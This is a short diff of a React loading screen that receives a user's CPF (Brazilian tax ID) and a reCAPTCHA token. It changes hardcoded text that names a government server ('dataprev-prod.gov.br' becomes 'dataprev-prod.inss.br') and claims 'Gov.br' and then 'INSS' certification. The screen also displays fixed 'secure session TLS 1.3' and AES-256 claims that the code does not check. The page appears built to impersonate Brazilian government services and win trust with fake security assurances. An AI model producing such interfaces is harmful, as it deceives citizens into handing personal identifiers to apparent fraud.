@@ -132,7 +132,7 @@ const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = fa
             <Lock className="h-2.5 sm:h-3 w-2.5 sm:w-3 text-accent" />
             <span>Sessão segura • TLS 1.3</span>
           </div>
-          <span className="hidden sm:inline">Servidor: dataprev-prod.gov.br</span>
+          <span className="hidden sm:inline">Servidor: dataprev-prod.inss.br</span>
           <span className="sm:hidden">dataprev-prod</span>
         </div>
       </div>
@@ -187,7 +187,7 @@ const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = fa
               <div>
                 <h4 className="font-bold text-foreground text-xs sm:text-sm">Ambiente Seguro</h4>
                 <p className="mt-0.5 text-[10px] sm:text-xs text-muted-foreground leading-relaxed">
-                  Processamento em ambiente certificado Gov.br. Dados transmitidos com criptografia AES-256.
+                  Processamento em ambiente certificado INSS. Dados transmitidos com criptografia AES-256.
                 </p>
               </div>
             </div>
